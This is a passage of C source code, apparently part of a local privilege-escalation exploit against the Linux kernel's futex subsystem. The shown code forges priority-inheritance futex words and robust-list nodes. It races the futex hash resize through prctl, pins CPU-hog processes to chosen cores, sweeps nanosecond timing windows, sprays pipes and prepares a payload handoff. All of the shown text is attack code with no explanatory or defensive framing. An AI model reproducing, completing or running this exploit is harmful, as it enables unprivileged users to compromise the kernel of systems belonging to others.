		       UINT64_C(100000000)) != 0 ||
	    pi_shared->resize_stopper_to_cpu2_rc != 0 ||
	    pi_shared->resize_stopper_to_cpu0_rc != 0)
		goto out;
	if (helper > 0) {
		if (waitpid(helper, &status, 0) != helper ||
		    !WIFEXITED(status) || WEXITSTATUS(status) != 0)
			goto out;
		helper = -1;
	}

	if (prctl(PR_SET_NAME, "pi-post-ctrl", 0, 0, 0) != 0)
		goto out;

	memset(&args, 0, sizeof(args));
	args.flags = CLONE_VM_LOCAL;
	args.exit_signal = SIGCHLD;
	args.stack = (uint64_t)(uintptr_t)pi_waiter_stack.usable;
	args.stack_size = STACK_SIZE;
	pi_waiter_pid = (pid_t)raw_clone3_pi_waiter(&args, sizeof(args));
	if (pi_waiter_pid <= 0 ||
	    wait_value(&pi_shared->pi_waiter_ready, 1, UINT64_C(1000000000)) !=
		    0 ||
	    pi_shared->pi_waiter_affinity_rc != 0)
		goto out;

	__atomic_store_n(&pi_shared->fake_pi_word,
			 (uint32_t)pi_shared->owner_pid & FUTEX_TID_MASK,
			 __ATOMIC_RELEASE);

	if (!aio_heartbeat ||
	    wait_uint64_nonzero(&aio_heartbeat->done, OWNER_STOPPER_WAIT_NS) !=
		    0 ||
	    __atomic_load_n(&aio_heartbeat->stop_requested, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&aio_heartbeat->stop_ack, __ATOMIC_ACQUIRE) != 1 ||
	    __atomic_load_n(&aio_heartbeat->completed, __ATOMIC_ACQUIRE) <
		    PI_RESERVOIR_AIO_MIN_COMPLETED ||
	    __atomic_load_n(&aio_heartbeat->completed, __ATOMIC_ACQUIRE) >
		    PI_RESERVOIR_AIO_MAX_COMPLETED ||
	    __atomic_load_n(&aio_heartbeat->completed, __ATOMIC_ACQUIRE) !=
		    aio_sequence ||
	    __atomic_load_n(&aio_heartbeat->syscall_ret, __ATOMIC_ACQUIRE) !=
		    0 ||
	    __atomic_load_n(&aio_heartbeat->phase, __ATOMIC_ACQUIRE) !=
		    PI_RESERVOIR_AIO_PHASE_IDLE ||
	    __atomic_load_n(&aio_heartbeat->active_seq, __ATOMIC_ACQUIRE) !=
		    0 ||
	    owner <= 1 || pi_shared->owner_pid != owner || owner_hog <= 1 ||
	    pi_shared->owner_hog_pid != owner_hog ||
	    pi_shared->owner_nodes_drop_ret != 0 ||
	    __atomic_load_n(&pi_shared->owner_nodes_dropped,
			    __ATOMIC_ACQUIRE) != 1 ||
	    __atomic_load_n(&pi_shared->owner_nodes_validated,
			    __ATOMIC_ACQUIRE) != 1 ||
	    pi_shared->owner_policy != SCHED_IDLE ||
	    pi_shared->owner_hog_policy != SCHED_OTHER ||
	    pi_shared->owner_hog_nice != 0 ||
	    __atomic_load_n(&pi_shared->owner_hog_go, __ATOMIC_ACQUIRE) != 0 ||
	    __atomic_load_n(&pi_shared->owner_hog_active, __ATOMIC_ACQUIRE) ||
	    __atomic_load_n(&pi_shared->owner_hog_done, __ATOMIC_ACQUIRE) ||
	    pi_shared->owner_hog_ret != INT_MIN ||
	    __atomic_load_n(&pi_shared->nodes[0].futex, __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS) ||
	    __atomic_load_n(&pi_shared->nodes[ROBUST_NODES - 1].futex,
			    __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS))
		goto out;
	if (raw_syscall3(SYS_SCHED_SETSCHEDULER_X86_64, 0, SCHED_OTHER,
			 (long)(uintptr_t)&controller_sched_param) < 0)
		goto out;
	controller_policy = raw_syscall1(SYS_SCHED_GETSCHEDULER_X86_64, 0);
	__atomic_store_n(&pi_shared->controller_policy_observed,
			 (int)controller_policy, __ATOMIC_RELEASE);
	if (controller_policy != SCHED_OTHER)
		goto out;

	__atomic_store_n(&pi_shared->pi_waiter_go, 1, __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->owner_exit_go, 1, __ATOMIC_RELEASE);
	(void)raw_syscall6(SYS_FUTEX_X86_64,
			   (long)(uintptr_t)&pi_shared->owner_exit_go,
			   FUTEX_WAKE, 1, 0, 0, 0);
	pi_shared->owner_node_wait_ns = monotonic_ns();
	pi_shared->owner_node_wait_ret = (int)raw_syscall6(
		SYS_FUTEX_X86_64, (long)(uintptr_t)&pi_shared->nodes[0].futex,
		FUTEX_WAIT, (uint32_t)pi_shared->owner_pid | FUTEX_WAITERS, 0,
		0, 0);
	pi_shared->owner_node_seen_ns = monotonic_ns();
	if (pi_shared->owner_node_wait_ret != 0 ||
	    __atomic_load_n(&pi_shared->nodes[0].futex, __ATOMIC_ACQUIRE) !=
		    (FUTEX_WAITERS | FUTEX_OWNER_DIED) ||
	    __atomic_load_n(&pi_shared->nodes[ROBUST_NODES - 1].futex,
			    __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS) ||
	    __atomic_load_n(&pi_shared->pi_waiter_done, __ATOMIC_ACQUIRE))
		goto out;
	__atomic_store_n(&pi_shared->owner_node_selfwake, 1, __ATOMIC_RELEASE);

	__atomic_store_n(&pi_shared->owner_tail_pending, 1, __ATOMIC_RELEASE);

	if (wait_int_busy(&pi_shared->pi_waiter_node_seen, 1,
			  OWNER_STOPPER_WAIT_NS) != 0 ||
	    __atomic_load_n(&pi_shared->owner_node_selfwake,
			    __ATOMIC_ACQUIRE) != 1 ||
	    __atomic_load_n(&pi_shared->nodes[0].futex, __ATOMIC_ACQUIRE) !=
		    (FUTEX_WAITERS | FUTEX_OWNER_DIED) ||
	    __atomic_load_n(&pi_shared->nodes[ROBUST_NODES - 1].futex,
			    __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS) ||
	    __atomic_load_n(&pi_shared->owner_tail_pending, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->pi_waiter_done, __ATOMIC_ACQUIRE))
		goto out;
	__atomic_store_n(&pi_shared->pi_waiter_attach_go, 1, __ATOMIC_RELEASE);
	if (wait_int_busy(&pi_shared->pi_waiter_entered, 1,
			  OWNER_STOPPER_WAIT_NS) != 0 ||
	    wait_uint32_busy(&pi_shared->fake_pi_word,
			     (uint32_t)pi_shared->owner_pid | FUTEX_WAITERS,
			     OWNER_STOPPER_WAIT_NS) != 0 ||
	    __atomic_load_n(&pi_shared->nodes[ROBUST_NODES - 1].futex,
			    __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS) ||
	    __atomic_load_n(&pi_shared->owner_tail_pending, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->pi_waiter_done, __ATOMIC_ACQUIRE))
		goto out;
	pi_waiters_seen_ns = monotonic_ns();
	__atomic_store_n(&pi_shared->pi_waiter_ref_ns, pi_waiters_seen_ns,
			 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->pi_waiter_ref_before_hog, 1,
			 __ATOMIC_RELEASE);

	__atomic_store_n(&pi_shared->owner_hog_wake_ns, monotonic_ns(),
			 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->owner_hog_go, 1, __ATOMIC_RELEASE);
	pi_shared->owner_hog_wake_ret = (int)raw_syscall6(
		SYS_FUTEX_X86_64, (long)(uintptr_t)&pi_shared->owner_hog_go,
		FUTEX_WAKE, 1, 0, 0, 0);
	if (pi_shared->owner_hog_wake_ret != 1 ||
	    !pi_shared->pi_waiter_ref_ns || !pi_shared->owner_hog_wake_ns ||
	    pi_shared->owner_hog_wake_ns < pi_shared->pi_waiter_ref_ns ||
	    __atomic_load_n(&pi_shared->nodes[ROBUST_NODES - 1].futex,
			    __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS) ||
	    __atomic_load_n(&pi_shared->owner_tail_pending, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->pi_waiter_done, __ATOMIC_ACQUIRE))
		goto out;
	__atomic_store_n(&pi_shared->owner_hog_runnable, 1, __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->owner_hog_post_ref, 1, __ATOMIC_RELEASE);

	pi_shared->controller_move_rc =
		move_pid_to_cpu(getpid(), OWNER_STOPPER_CPU);
	if (pi_shared->controller_move_rc != 0 ||
	    pi_shared->controller_policy_observed != SCHED_OTHER ||
	    __atomic_load_n(&pi_shared->owner_hog_runnable, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->owner_hog_post_ref, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->nodes[ROBUST_NODES - 1].futex,
			    __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS) ||
	    __atomic_load_n(&pi_shared->owner_tail_pending, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->pi_waiter_done, __ATOMIC_ACQUIRE))
		goto out;
	if (wait_int_busy(&pi_shared->owner_hog_active, 1,
			  OWNER_STOPPER_WAIT_NS) != 0 ||
	    pi_shared->owner_hog_ret != 0 ||
	    pi_shared->owner_hog_policy != SCHED_OTHER ||
	    pi_shared->owner_hog_nice != 0 || !pi_shared->owner_hog_active_ns ||
	    pi_shared->owner_hog_active_ns < pi_shared->owner_hog_wake_ns ||
	    __atomic_load_n(&pi_shared->nodes[ROBUST_NODES - 1].futex,
			    __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS) ||
	    __atomic_load_n(&pi_shared->owner_tail_pending, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->pi_waiter_done, __ATOMIC_ACQUIRE))
		goto out;
	__atomic_store_n(&pi_shared->owner_hog_active_post_ref, 1,
			 __ATOMIC_RELEASE);
	if (__atomic_load_n(&pi_shared->owner_hog_active, __ATOMIC_ACQUIRE) !=
		    1 ||
	    pi_shared->owner_hog_ret != 0 ||
	    __atomic_load_n(&pi_shared->owner_hog_active_post_ref,
			    __ATOMIC_ACQUIRE) != 1 ||
	    __atomic_load_n(&pi_shared->nodes[ROBUST_NODES - 1].futex,
			    __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS) ||
	    __atomic_load_n(&pi_shared->owner_tail_pending, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->pi_waiter_done, __ATOMIC_ACQUIRE))
		goto out;

	{
		cpu_set_t hog_set;
		int move_rc;

		if (pi_shared->resize_hog_pid <= 1 || resize_hog_pids[0] <= 1 ||
		    pi_shared->resize_hog_pid != resize_hog_pids[0])
			goto out;
		CPU_ZERO(&hog_set);
		CPU_SET(2, &hog_set);
		move_rc = sched_setaffinity(pi_shared->resize_hog_pid,
					    sizeof(hog_set), &hog_set) == 0 ?
				  0 :
				  -errno;
		__atomic_store_n(&pi_shared->resize_release_move_rc, move_rc,
				 __ATOMIC_RELEASE);
		__atomic_store_n(&pi_shared->resize_release_move_ns,
				 monotonic_ns(), __ATOMIC_RELEASE);
		__atomic_store_n(&pi_shared->resize_release_move_done, 1,
				 __ATOMIC_RELEASE);
		if (move_rc != 0)
			goto out;
	}

	if (__atomic_load_n(&pi_shared->pi_waiter_ref_before_hog,
			    __ATOMIC_ACQUIRE) != 1 ||
	    __atomic_load_n(&pi_shared->owner_hog_post_ref, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->owner_hog_active_post_ref,
			    __ATOMIC_ACQUIRE) != 1 ||
	    pi_shared->owner_hog_wake_ret != 1 ||
	    pi_shared->owner_hog_ret != 0 ||
	    pi_shared->owner_hog_policy != SCHED_OTHER ||
	    pi_shared->owner_hog_nice != 0 ||
	    pi_shared->controller_move_rc != 0 ||
	    pi_shared->controller_policy_observed != SCHED_OTHER ||
	    __atomic_load_n(&pi_shared->nodes[ROBUST_NODES - 1].futex,
			    __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS) ||
	    __atomic_load_n(&pi_shared->owner_tail_pending, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->pi_waiter_done, __ATOMIC_ACQUIRE))
		goto out;
	__atomic_store_n(&pi_shared->pi_waiter_ref_before_resize_release, 1,
			 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->resize_release_after_hog_active, 1,
			 __ATOMIC_RELEASE);
	__atomic_store_n(&controller->release_resize, 1, __ATOMIC_RELEASE);
	if (wait_value(&controller->hog_done, 1, UINT64_C(100000000)) != 0 ||
	    waitpid(resize_hog_pids[0], &status, 0) != resize_hog_pids[0] ||
	    !WIFEXITED(status) || WEXITSTATUS(status) != 0)
		goto out;
	resize_hog_pids[0] = -1;
	resize_publish_wait_start_ns = monotonic_ns();
	if (sleep_until_ns(resize_publish_wait_start_ns +
			   RESIZE_PUBLISH_DELAY_NS) != 0)
		goto out;
	if (__atomic_load_n(&state.resize_prctl_ret, __ATOMIC_ACQUIRE) !=
		    LONG_MIN ||
	    state.resize_pid <= 1 || kill(state.resize_pid, 0) != 0)
		goto out;

	if (__atomic_load_n(&pi_shared->pi_waiter_ref_before_resize_release,
			    __ATOMIC_ACQUIRE) != 1 ||
	    __atomic_load_n(&pi_shared->resize_release_after_hog_active,
			    __ATOMIC_ACQUIRE) != 1 ||
	    __atomic_load_n(&pi_shared->owner_hog_active, __ATOMIC_ACQUIRE) !=
		    1 ||
	    pi_shared->owner_hog_ret != 0 ||
	    pi_shared->owner_hog_wake_ret != 1 ||
	    __atomic_load_n(&pi_shared->owner_hog_runnable, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->nodes[ROBUST_NODES - 1].futex,
			    __ATOMIC_ACQUIRE) !=
		    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS) ||
	    __atomic_load_n(&pi_shared->owner_tail_pending, __ATOMIC_ACQUIRE) !=
		    1 ||
	    __atomic_load_n(&pi_shared->pi_waiter_done, __ATOMIC_ACQUIRE))
		goto out;
	__atomic_store_n(&pi_shared->resize_publish_before_owner_release, 1,
			 __ATOMIC_RELEASE);

	for (size_t i = 1; i < ROBUST_NODES; ++i)
		__atomic_store_n(&pi_shared->nodes[i].list.next,
				 &pi_shared->robust_head.list,
				 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->owner_hog_release, 1, __ATOMIC_RELEASE);
	if (wait_value(&pi_shared->pi_waiter_done, 1, UINT64_C(2000000000)) !=
		    0 ||
	    pi_shared->pi_waiter_ret != -ESRCH ||
	    waitpid(pi_waiter_pid, &status, 0) != pi_waiter_pid ||
	    !WIFEXITED(status) || WEXITSTATUS(status) != 0)
		goto out;
	pi_waiter_pid = -1;
	if (waitpid(owner, &status, 0) != owner || !WIFEXITED(status) ||
	    WEXITSTATUS(status) != 0)
		goto out;
	owner = -1;
	if (waitpid(owner_hog, &status, 0) != owner_hog || !WIFEXITED(status) ||
	    WEXITSTATUS(status) != 0)
		goto out;
	owner_hog = -1;

	if (sleep_until_ns(monotonic_ns() + HASH_FOLD_WAIT_NS) != 0)
		goto out;
	final_slots = raw_syscall5(SYS_PRCTL_X86_64, PR_FUTEX_HASH_LOCAL,
				   PR_FUTEX_HASH_GET_SLOTS_LOCAL, 0, 0, 0);
	if (final_slots != PRIMARY_HASH_SLOTS)
		goto out;

	if (__atomic_load_n(&state.resize_prctl_ret, __ATOMIC_ACQUIRE) !=
		    LONG_MIN ||
	    state.resize_pid <= 1 || kill(state.resize_pid, 0) != 0)
		goto out;
	(void)wait_value(&controller->hog_done, 1, UINT64_C(500000000));
	if (helper > 0) {
		(void)waitpid(helper, NULL, 0);
		helper = -1;
	}
	for (unsigned int i = 0; i < RESIZE_HOG_CPU_COUNT; ++i) {
		if (resize_hog_pids[i] > 0) {
			(void)kill(resize_hog_pids[i], SIGKILL);
			(void)waitpid(resize_hog_pids[i], NULL, 0);
			resize_hog_pids[i] = -1;
		}
	}
	result = ATTEMPT_CANDIDATE;

out:
	if (result != ATTEMPT_CANDIDATE && !race_armed) {
		__atomic_store_n(&controller->release_resize, 1,
				 __ATOMIC_RELEASE);
		__atomic_store_n(&pi_shared->owner_hog_release, 1,
				 __ATOMIC_RELEASE);
		__atomic_store_n(&pi_shared->owner_hog_go, 1, __ATOMIC_RELEASE);
		(void)syscall(SYS_FUTEX_X86_64, &pi_shared->owner_hog_go,
			      FUTEX_WAKE, 1, NULL, NULL, 0);
		__atomic_store_n(&pi_shared->owner_exit_go, 1,
				 __ATOMIC_RELEASE);
		(void)syscall(SYS_FUTEX_X86_64, &pi_shared->owner_exit_go,
			      FUTEX_WAKE, 1, NULL, NULL, 0);
		__atomic_store_n(&pi_shared->pi_waiter_go, 1, __ATOMIC_RELEASE);
		__atomic_store_n(&pi_shared->pi_waiter_attach_go, 1,
				 __ATOMIC_RELEASE);
		if (pi_waiter_pid > 0) {
			(void)kill(pi_waiter_pid, SIGKILL);
			(void)waitpid(pi_waiter_pid, NULL, 0);
		}
		if (helper > 0) {
			(void)kill(helper, SIGKILL);
			(void)waitpid(helper, NULL, 0);
		}
		for (unsigned int i = 0; i < RESIZE_HOG_CPU_COUNT; ++i) {
			if (resize_hog_pids[i] > 0) {
				(void)kill(resize_hog_pids[i], SIGKILL);
				(void)waitpid(resize_hog_pids[i], NULL, 0);
			}
		}
		if (owner_hog > 0) {
			(void)kill(owner_hog, SIGKILL);
			(void)waitpid(owner_hog, NULL, 0);
		}
		if (owner > 0) {
			(void)kill(owner, SIGKILL);
			(void)waitpid(owner, NULL, 0);
		}
	}
	if (aio_heartbeat) {
		(void)munmap(aio_heartbeat, sizeof(*aio_heartbeat));
		aio_heartbeat = NULL;
	}
	return result;
}

#define AIO_RESERVOIR_RESIZE_LAG_NS UINT64_C(20000)
#define AIO_RESERVOIR_GATE_WAIT_MS 5000U
#define AIO_RESERVOIR_REQUIRED_CONTROL_CALLS 1U

struct aio_reservoir_launch_shared {
	_Alignas(64) _Atomic int parent_no_new_privs_enabled;
	_Atomic int aio_started_without_no_new_privs;
	_Atomic int aio_entered;
	_Atomic int terminal_word;
	pid_t parent_pid;
};

static struct aio_reservoir_launch_shared *aio_reservoir_launch;
static unsigned int hash_control_call_count;

static int aio_reservoir_futex_wait(_Atomic int *word, int expected)
{
	return (int)syscall(SYS_futex, word, FUTEX_WAIT, expected, NULL, NULL,
			    0);
}

static int aio_reservoir_futex_wake(_Atomic int *word, int count)
{
	return (int)syscall(SYS_futex, word, FUTEX_WAKE, count, NULL, NULL, 0);
}

static uint64_t aio_reservoir_now_ns(void)
{
	struct timespec now;

	if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
		return 0;
	return (uint64_t)now.tv_sec * UINT64_C(1000000000) +
	       (uint64_t)now.tv_nsec;
}

static int aio_reservoir_sleep_1ms(void)
{
	struct timespec pause = { .tv_sec = 0, .tv_nsec = 1000000 };
	int result;

	do {
		result = nanosleep(&pause, &pause);
	} while (result != 0 && errno == EINTR);
	return result;
}

static int aio_reservoir_wait_value(_Atomic int *word, int wanted,
				    uint64_t timeout_ns)
{
	uint64_t start = aio_reservoir_now_ns();

	if (!start || start > UINT64_MAX - timeout_ns)
		return -1;
	while (atomic_load_explicit(word, memory_order_acquire) != wanted) {
		uint64_t now = aio_reservoir_now_ns();

		if (!now || now >= start + timeout_ns ||
		    aio_reservoir_sleep_1ms() != 0)
			return -1;
	}
	return 0;
}

static void aio_reservoir_coordinator(void) __attribute__((noreturn));

static void aio_reservoir_coordinator(void)
{
	if (prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) != 0)
		_exit(81);
	atomic_store_explicit(
		&aio_reservoir_launch->aio_started_without_no_new_privs, 1,
		memory_order_release);
	(void)aio_reservoir_futex_wake(
		&aio_reservoir_launch->aio_started_without_no_new_privs, 1);
	while (atomic_load_explicit(
		       &aio_reservoir_launch->parent_no_new_privs_enabled,
		       memory_order_acquire) != 1) {
		int current = atomic_load_explicit(
			&aio_reservoir_launch->parent_no_new_privs_enabled,
			memory_order_relaxed);

		(void)aio_reservoir_futex_wait(
			&aio_reservoir_launch->parent_no_new_privs_enabled,
			current);
	}

	if (prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) != 0 ||
	    getppid() != aio_reservoir_launch->parent_pid)
		_exit(82);
	atomic_store_explicit(&aio_reservoir_launch->aio_entered, 1,
			      memory_order_release);
	_exit(run_aio_reservoir_worker());
}

static int prefork_aio_reservoir(pid_t *aio_pid_out)
{
	struct payload_handoff_ids ids;
	pid_t aio_pid;

	if (payload_handoff_capture_ids(&ids) != 0 ||
	    !payload_handoff_ids_are_start(&ids) ||
	    prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) != 0)
		return 2;
	aio_reservoir_launch = mmap(NULL, sizeof(*aio_reservoir_launch),
				    PROT_READ | PROT_WRITE,
				    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	aio_heartbeat = mmap(NULL, sizeof(*aio_heartbeat),
			     PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS,
			     -1, 0);
	if (aio_reservoir_launch == MAP_FAILED || aio_heartbeat == MAP_FAILED)
		return 2;
	memset(aio_heartbeat, 0, sizeof(*aio_heartbeat));
	__atomic_store_n(&aio_heartbeat->magic,
			 PI_RESERVOIR_AIO_HEARTBEAT_MAGIC, __ATOMIC_RELEASE);
	memset(aio_reservoir_launch, 0, sizeof(*aio_reservoir_launch));
	aio_reservoir_launch->parent_pid = getpid();

	aio_pid = fork();
	if (aio_pid < 0)
		return 2;
	if (aio_pid == 0)
		aio_reservoir_coordinator();
	if (aio_reservoir_wait_value(
		    &aio_reservoir_launch->aio_started_without_no_new_privs, 1,
		    UINT64_C(1000000000)) != 0)
		return 2;
	*aio_pid_out = aio_pid;
	return 0;
}

static int commit_aio_parent_no_new_privs(void)
{
	if (verify_unprivileged_start() != 0 ||
	    prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) != 1)
		return -1;
	atomic_store_explicit(
		&aio_reservoir_launch->parent_no_new_privs_enabled, 1,
		memory_order_release);
	(void)aio_reservoir_futex_wake(
		&aio_reservoir_launch->parent_no_new_privs_enabled, 1);
	if (block_all_catchable_signals() != 0)
		return -1;
	return 0;
}

static int run_pi_reservoir_control(void)
{
	if (hash_control_call_count != 0)
		return ATTEMPT_ERROR;
	hash_control_call_count = 1;
	if (verify_hash_resize_control() != 0)
		return ATTEMPT_ERROR;

	controller = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
			  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pi_shared = mmap(NULL, sizeof(*pi_shared), PROT_READ | PROT_WRITE,
			 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (controller == MAP_FAILED || pi_shared == MAP_FAILED)
		return ATTEMPT_ERROR;
	return pi_reservoir_attempt(AIO_RESERVOIR_RESIZE_LAG_NS,
				    AIO_RESERVOIR_GATE_WAIT_MS);
}

static int aio_reservoir_candidate_valid(int result)
{
	return result == ATTEMPT_CANDIDATE &&
	       hash_control_call_count ==
		       AIO_RESERVOIR_REQUIRED_CONTROL_CALLS &&
	       atomic_load_explicit(
		       &aio_reservoir_launch->aio_started_without_no_new_privs,
		       memory_order_acquire) == 1 &&
	       atomic_load_explicit(&aio_reservoir_launch->aio_entered,
				    memory_order_acquire) == 1 &&
	       state.resize_pid > 1 && kill(state.resize_pid, 0) == 0 &&
	       __atomic_load_n(&state.resize_prctl_ret, __ATOMIC_ACQUIRE) ==
		       LONG_MIN;
}

#ifndef SYS_pidfd_send_signal
#define SYS_pidfd_send_signal 424
#endif
#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif

#define PIPE_BANK_WORKERS 4
#define PIPE_BANK_WAVES 15
#define PIPE_BANK_PIPES_PER_WAVE 16
#define PIPE_BANK_PIPES_PER_WORKER (PIPE_BANK_WAVES * PIPE_BANK_PIPES_PER_WAVE)
#define PIPE_BANK_TOTAL_PIPES (PIPE_BANK_WORKERS * PIPE_BANK_PIPES_PER_WORKER)
#define HASH_FLUSHER_COUNT 11U
#define HASH_FLUSHER_CPU 1U
#define HASH_FLUSH_INITIAL_SLOTS 8U
#define HASH_FLUSH_EXPANDED_SLOTS 16U
#define PIPE_BANK_READY_TOTAL (PIPE_BANK_WORKERS + 1U + HASH_FLUSHER_COUNT)
#define PIPE_BANK_PREP_PIPE_BYTES 8192
#define PIPE_BANK_DEFAULT_PIPE_BYTES 65536
#define PIPE_BANK_CAPTURE_PIPE_BYTES 65536
#define PIPE_BANK_TIMEOUT_NS UINT64_C(5000000000)
#define PIPE_BANK_MAX_HANDOFF_NS UINT64_C(2000000000)
#define PIPE_BANK_MAX_LATE_NS UINT64_C(500000000)

struct pipe_bank_shared {
	_Alignas(64) _Atomic int ready;
	_Atomic int errors;
	_Atomic int go;
	_Atomic int generation;
	_Atomic int wave;
	_Atomic int tickets;
	_Atomic int census_go;
	_Atomic int census_done;
	_Atomic int retained;
	_Atomic int stage;
	_Atomic int stage1_done;
	_Atomic int stage2_done;
	_Atomic int worker_park_intent;
	_Atomic int controller_park_intent;
	_Atomic int held;
	_Atomic int hash_flush_arm;
	_Atomic int hash_flush_armed;
	_Atomic int hash_flush_go;
	_Atomic int hash_flush_done;
	_Atomic int hash_flusher_park_intent;
	_Atomic int latest_target_pid;
	_Atomic unsigned int target_generation;
	_Atomic int target_publish_count;
	_Atomic uint64_t selector_return_ns;
	_Atomic uint64_t handoff_ns;
};

static const unsigned int pipe_wave_delays_ms[PIPE_BANK_WAVES] = {
	100,  250,  500,  750,	1000, 1500, 2000, 3000,
	4000, 4500, 4750, 5000, 5500, 6500, 8000,
};

static struct pipe_bank_shared *pipe_bank_state;
static void *futex_race_shared_storage;
static int pipe_bank_target_fd = -1;
static void *pipe_bank_target_map;
struct futex_race_shared;
static int pipe_bank_publish(struct futex_race_shared *race_state,
			     unsigned int generation, pid_t target);
static int arm_hash_flushers(void);

#define FUTEX_RACE_INITIAL_HASH_SLOTS 8U
#define FUTEX_RACE_EXPANDED_HASH_SLOTS 262144U
#define FUTEX_RACE_CONTROLLER_CPU 1U
#define FUTEX_RACE_WATCHDOG_CPU 2U
#define FUTEX_RACE_LANDING_CPU 3U
#define FUTEX_RACE_STACK_SIZE (UINT64_C(1024) * UINT64_C(1024))

#define FUTEX_RACE_SWEEP_FIRST_NS UINT64_C(1600)
#define FUTEX_RACE_SWEEP_STEP_NS UINT64_C(2)
#define FUTEX_RACE_SWEEP_BAND 2200U

#define FUTEX_RACE_SWEEP_PASSES 4U
#define FUTEX_RACE_SWEEP_POINTS \
	(FUTEX_RACE_SWEEP_BAND * FUTEX_RACE_SWEEP_PASSES)
#define FUTEX_RACE_DEADLINE_LEAD_NS UINT64_C(20000000)
#define FUTEX_RACE_TICK_PERIOD_NS UINT64_C(1000000)
#define FUTEX_RACE_HELPER_WAKE_LEAD_NS UINT64_C(1000)
#define FUTEX_RACE_SETUP_TIMEOUT_NS UINT64_C(250000000)
#define FUTEX_RACE_REAP_TIMEOUT_NS UINT64_C(500000000)

#define FUTEX_RACE_SELECTOR_TIMEOUT_NS UINT64_C(25000000)
#define FUTEX_RACE_LATEQ_TIMEOUT_NS UINT64_C(20000000)
#define FUTEX_RACE_LATEQ_SETTLE_NS UINT64_C(100000)
#define FUTEX_RACE_CYCLE_TIMEOUT_NS UINT64_C(5000000)
#define FUTEX_RACE_WORD_PAGE_SIZE 4096U
#define FUTEX_RACE_INITIAL_HASH_MASK (FUTEX_RACE_INITIAL_HASH_SLOTS - 1U)
#define FUTEX_RACE_JHASH_INITVAL UINT32_C(0xdeadbeef)
#define SYS_GETCPU_X86_64 309

#ifndef PR_FUTEX_HASH
#define PR_FUTEX_HASH 78
#endif
#ifndef PR_FUTEX_HASH_SET_SLOTS
#define PR_FUTEX_HASH_SET_SLOTS 1
#endif
#ifndef PR_FUTEX_HASH_GET_SLOTS
#define PR_FUTEX_HASH_GET_SLOTS 2
#endif
#ifndef FUTEX_LOCK_PI_PRIVATE
#define FUTEX_LOCK_PI_PRIVATE (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#endif
#ifndef FUTEX_UNLOCK_PI_PRIVATE
#define FUTEX_UNLOCK_PI_PRIVATE (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#endif
#ifndef FUTEX_LOCK_PI2_PRIVATE
#define FUTEX_LOCK_PI2_PRIVATE (FUTEX_LOCK_PI2 | FUTEX_PRIVATE_FLAG)
#endif

struct futex_race_shared {
	_Alignas(64) _Atomic unsigned int generation;
	_Atomic int target_ready;
	_Atomic int target_timer_observed;
	_Atomic int target_words_cow_ready;
	_Atomic int target_start;
	_Atomic int target_entered;
	_Atomic int target_done;
	_Atomic long target_result;
	_Atomic long target_unlock_result;
	_Atomic long target_warm_result;
	_Atomic long target_warm_unlock_result;
	_Atomic int target_policy;
	_Atomic int target_nice;
	_Atomic int target_cpu;
	_Atomic uint64_t target_ready_ns;
	_Atomic uint64_t target_enter_ns;
	_Atomic uint64_t target_return_ns;

	_Alignas(64) _Atomic int helper_ready;
	_Atomic int helper_waiting_arm;
	_Atomic int helper_arm;
	_Atomic int helper_active;
	_Atomic int helper_release;
	_Atomic int helper_park_cmd;
	_Atomic int helper_park_intent;
	_Atomic int helper_park_failed;
	_Atomic int helper_park_word;
	_Atomic uint64_t helper_park_call_ns;
	_Atomic int helper_timer_result;
	_Atomic int helper_policy;
	_Atomic int helper_cpu;
	_Atomic uint64_t helper_ready_ns;
